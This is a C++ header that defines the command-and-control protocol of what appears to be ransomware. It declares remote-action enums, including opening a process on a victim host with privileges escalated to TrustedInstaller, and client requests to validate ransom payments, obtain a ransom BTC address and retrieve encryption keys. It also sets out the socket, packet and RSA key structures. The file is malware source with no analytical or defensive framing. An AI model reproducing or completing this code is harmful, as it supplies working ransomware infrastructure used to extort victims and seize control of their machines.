#pragma once

#include <openssl/bio.h>
#include <vector>

#include "Win32Natives.h"
#include "ProcessManager.h"

typedef std::vector<unsigned char> BYTESTRING;

constexpr unsigned short MAX_BUFFER_LEN = 256;

// bitwise flags optionally included in packets....
const int NO_CONSOLE = 1 << 0; // default is to make a console when a command is ran on remote host
const int RUN_AS_HIGHEST = 1 << 1; // try to get highest privellages (trusted installer) and run as that
const int RUN_AS_NORMAL = 1 << 2; // run as whatever privellages are available
const int USE_CLI = 1 << 3; // use command prompt
const int RESPOND_WITH_STATUS = 1 << 4; // server wants a response
const int PACKET_IS_A_COMMAND = 1 << 5; // this packet is a command and the action in the packet must be performed

// Response codes sent from the client to the server
// Usually after a remoteaction is completed
// 'C' = Code
enum ClientResponseCode {
    kResponseOk    = 0,
    kResponseError = -1,
};

// Enums dictating which action to perform on the client
// Sent from the server to client
enum RemoteAction {
    kNone,
    kOpenRemoteProcess,
    kKillClient, // forcefully disconnect the client
    kPingClient,
    kReturnPrivateRSAKey,
};

enum SocketTypes {
    UDP,
    TCP,
};

/*
    A struct representing a server that
    clients can connect to and send requests on.
    Servers have a socket file descriptor which is used
    to send and receive information over sockets.
*/
struct Server {
    SOCKET             sfd;      // Socket File Descriptor
    int                domain;   
    int                type;     // Communcation semmantic type.
    int                protocol; // Server protocol. All server protocols will be 0.
    int                port;     
    sockaddr_in        addr;     // address struct with info on the server address
    BOOL               alive;    // is server on
    BOOL               accepting; // accepting connections
    
    Server()
        : sfd(INVALID_SOCKET), domain(AF_INET), type(-1),
        protocol(0), port(-1), addr({0}), alive(FALSE)
    {
    }
    
    Server(int sfd, int domain, int type, int port, sockaddr_in addr)
        : sfd(sfd), domain(domain), type(type),
        protocol(0), port(port), addr(addr),
        alive(FALSE)
    {
    }
};

/*
    A struct representing a message sent from
    a client to a server. 
*/
struct ClientResponse {
    ClientResponseCode responseCode = kResponseError;    
    RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
};

struct ProcessInformation {
    /*
        If run as trusted installer and run as admin
        are both true, the process will be ran with the highest
        privellages, in this case, trusted installer.
    */
    BOOL               runAsTrustedInstaller;
    BOOL               runAsAdministrator;
    DWORD              creationFlags;         // Windows openprocess creation flags
    std::string        applicationName;       // Name of the application to start
};

// A response from the udp server to the udp client
// contains information about the tcp server
struct UDPResponse {
    Server      TCPServer; // Info about the tcp server so the client can connect to it
    BOOL        isValid;

    UDPResponse() = default;
    UDPResponse(Server tcp) 
        : TCPServer(tcp), isValid(TRUE)
    {
    }
};

/*
    Packet of information sent over sockets.
*/
#pragma pack(push, 1)
struct Packet {
    char buffer[MAX_BUFFER_LEN];
    uint16_t buffLen;
    RemoteAction action;
    int flags;

    inline const void insert(char* s) { memcpy_s(buffer, MAX_BUFFER_LEN, s, strlen(s)); buffLen = strlen(s); }
    inline const void insert(std::string s) { insert(s.c_str()); buffLen = s.size(); }
};
#pragma pack(pop, 0)

/*
    When a client requests the tcp server to do something
*/
struct ClientRequest {
    enum Action {
        kNone = 0,
        kConnectClient,
        kRequestPublicEncryptionKey,
        kRequestPrivateEncryptionKey,
        kValidateRansomPayment,
        kRequestRansomBTCAddress,
        kPing,
        kDisconnectClient,
        kGetRequestEncryptionKeys,
        kGetRequestEncryptionKeyPrivate,
        kGetRequestEncryptionKeyPublic
    };

    BOOL              valid;
    Action            action;
    SOCKET            udp;
    SOCKET            tcp;
    
    ClientRequest() = default;

    ClientRequest(
        Action todo, SOCKET tcp = INVALID_SOCKET, SOCKET udp = INVALID_SOCKET
    ) : valid(TRUE), action(todo), udp(udp), tcp(tcp)
    {
    }
};

struct RSAKeys {
    RSA* pub;
    RSA* priv;
};

typedef UDPResponse   UDPMessage;
typedef ClientRequest ClientMessage;
typedef Packet ServerCommand, ServerRequest, ServerResponse;
